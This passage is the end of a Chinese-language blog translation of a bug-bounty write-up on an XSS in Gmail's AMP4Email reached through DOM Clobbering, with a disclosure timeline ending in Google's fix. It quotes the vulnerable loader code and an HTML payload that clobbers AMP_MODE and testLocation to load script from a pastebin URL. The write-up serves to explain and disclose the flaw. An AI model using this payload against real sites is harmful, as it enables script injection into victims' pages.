class="string">"/rtv/"</span> + AMP_MODE.rtvVersion; + <span class="string">"/"</span> + singlePass + <span class="string">"v0/"</span> + pluginName + <span class="string">".js"</span>;</span><br><span class="line"> </span><br><span class="line"><span class="built_in">document</span>.head.appendChild(b);</span><br></pre></td></tr></table></figure>
+<p>在第一行，代码创建了一个新的<code>script</code>元素。然后，检查 <code>AMP_MODE.test</code> 和<code>window.testLocation</code> 是否为真。如他们都为真且<code>AMP_MODE.localDev</code>为真（11行），然后<code>window.testLocation</code>被脚本用作生成URL。由于代码的编写方式和<code>DOM Clobbering</code>，第一眼看上去可能不是很明显，但实际上我们可以控制整个URL。我们假设<code>AMP_MODE.test</code> 和<code>window.testLocation</code> 都为真，代码可以进一步简化。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> script = <span class="built_in">window</span>.document.createElement(<span class="string">"script"</span>);</span><br><span class="line">script.async = <span class="literal">false</span>;</span><br><span class="line"> </span><br><span class="line">b.src = <span class="built_in">window</span>.testLocation.protocol + <span class="string">"//"</span> + </span><br><span class="line">        <span class="built_in">window</span>.testLocation.host + <span class="string">"/dist/rtv/"</span> + </span><br><span class="line">        AMP_MODE.rtvVersion; + <span class="string">"/"</span> + </span><br><span class="line">        (AMP_MODE.singlePassType ? AMP_MODE.singlePassType + <span class="string">"/"</span> : <span class="string">""</span>) + </span><br><span class="line">        <span class="string">"v0/"</span> + pluginName + <span class="string">".js"</span>;</span><br><span class="line"> </span><br><span class="line"><span class="built_in">document</span>.head.appendChild(b);</span><br></pre></td></tr></table></figure>
+<p>还记得我们之前使用<code>DOM Clobbering</code>重载 <code>window.test1.test2</code> 的例子么？现在我们需要做同样的事情，只不过换成重载<code>window.testLocation.protocol</code>。所以最终的payload为：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- We need to make AMP_MODE.localDev and AMP_MODE.test truthy--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">"AMP_MODE"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">"AMP_MODE"</span> <span class="attr">name</span>=<span class="string">"localDev"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">"AMP_MODE"</span> <span class="attr">name</span>=<span class="string">"test"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">&lt;!-- window.testLocation.protocol is a base for the URL --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">"testLocation"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">"testLocation"</span> <span class="attr">name</span>=<span class="string">"protocol"</span> </span></span><br><span class="line"><span class="tag">   <span class="attr">href</span>=<span class="string">"https://pastebin.com/raw/0tn8z0rG#"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>实际上，由于AMP中部署了<code>Content-Security-Policy</code>，所以代码并没有在现实中执行：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src 'none'; </span><br><span class="line">script-src 'sha512-oQwIl...==' </span><br><span class="line">  https://cdn.ampproject.org/rtv/ </span><br><span class="line">  https://cdn.ampproject.org/v0.js </span><br><span class="line">  https://cdn.ampproject.org/v0/</span><br></pre></td></tr></table></figure>
+<p>我没有找到绕过CSP的方法，但在尝试这么做时，我发现了一个有趣的绕过基于dir的CSP的方法，关于这个方法我发了一条推特，但之后我发现这种方法在2016年的CTF中已经使用过了。对于Google的漏洞奖励计划，不要指望绕过CSP就能得到全额奖励。这仍然是一个有趣的挑战，也许其他人会找到办法绕过它。</p>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>在这篇文章中，我展示了在满足某些条件时如何使用<code>DOM Clobbering</code>来执行<code>XSS</code>。如果你想尝试一下这个XSS，可以在这里找到<a href="https://securitymb.github.io/xss/1/?xss=" target="_blank" rel="noopener">XXS挑战</a>。</p>
+<h4 id="时间轴"><a href="#时间轴" class="headerlink" title="时间轴"></a>时间轴</h4><ul>
+<li>2019年8月15日  -  向谷歌发送报告</li>
+<li>2019年8月16日  -  得到谷歌响应</li>
+<li>2019年9月1日  -  谷歌确认漏洞</li>
+<li>2019年10月12日 -  来自谷歌的确认，bug已经修复(尽管实际上它发生的时间更早)</li>
+<li>2019年11月18日 - 公开</li>
+</ul>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="https://www.yuque.com/u447199">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#什么是AMP4Email？"><span class="toc-number">1.</span> <span class="toc-text">什么是AMP4Email？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DOM-Clobbering"><span class="toc-number">2.</span> <span class="toc-text">DOM Clobbering</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#AMP4Email中实现DOM-Clobbering"><span class="toc-number">3.</span> <span class="toc-text">AMP4Email中实现DOM Clobbering</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#总结"><span class="toc-number">4.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#时间轴"><span class="toc-number">5.</span> <span class="toc-text">时间轴</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://sy-yunyi.github.io/2019/12/06/翻译-XSS in GMail’s AMP4Email via DOM Clobbering/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://sy-yunyi.github.io/2019/12/06/翻译-XSS in GMail’s AMP4Email via DOM Clobbering/&text=翻译|XSS in GMail’s AMP4Email via DOM Clobbering"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://sy-yunyi.github.io/2019/12/06/翻译-XSS in GMail’s AMP4Email via DOM Clobbering/&title=翻译|XSS in GMail’s AMP4Email via DOM Clobbering"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://sy-yunyi.github.io/2019/12/06/翻译-XSS in GMail’s AMP4Email via DOM Clobbering/&is_video=false&description=翻译|XSS in GMail’s AMP4Email via DOM Clobbering"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=翻译|XSS in GMail’s AMP4Email via DOM Clobbering&body=Check out this article: https://sy-yunyi.github.io/2019/12/06/翻译-XSS in GMail’s AMP4Email via DOM Clobbering/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://sy-yunyi.github.io/2019/12/06/翻译-XSS in GMail’s AMP4Email via DOM Clobbering/&title=翻译|XSS in GMail’s AMP4Email via DOM Clobbering"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://sy-yunyi.github.io/2019/12/06/翻译-XSS in GMail’s AMP4Email via DOM Clobbering/&title=翻译|XSS in GMail’s AMP4Email via DOM Clobbering"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://sy-yunyi.github.io/2019/12/06/翻译-XSS in GMail’s AMP4Email via DOM Clobbering/&title=翻译|XSS in GMail’s AMP4Email via DOM Clobbering"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://sy-yunyi.github.io/2019/12/06/翻译-XSS in GMail’s AMP4Email via DOM Clobbering/&title=翻译|XSS in GMail’s AMP4Email via DOM Clobbering"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://sy-yunyi.github.io/2019/12/06/翻译-XSS in GMail’s AMP4Email via DOM Clobbering/&name=翻译|XSS in GMail’s AMP4Email via DOM Clobbering&description=&lt;blockquote&gt;
+&lt;p&gt;原文地址：&lt;a href=&#34;https://research.securitum.com/xss-in-amp4email-dom-clobbering/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://research.securitum.com/xss-in-amp4email-dom-clobbering/&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;这篇文章是介绍我在2019年八月的谷歌漏洞奖励计划中提交的一个AMP4Email中的&lt;code&gt;XSS&lt;/code&gt;漏洞，目前已经得到了修复。这个&lt;code&gt;XSS&lt;/code&gt;是现实世界中浏览器中著名的DOM Clobbering问题的一个真实案例。&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://sy-yunyi.github.io/2019/12/06/翻译-XSS in GMail’s AMP4Email via DOM Clobbering/&t=翻译|XSS in GMail’s AMP4Email via DOM Clobbering"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 Six
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="https://www.yuque.com/u447199">Projects</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+    <!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<!-- clipboard -->
+
+  <script src="/lib/clipboard/clipboard.min.js"></script>
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight .code pre").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      target: function(trigger) {
+        return trigger.nextElementSibling;
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
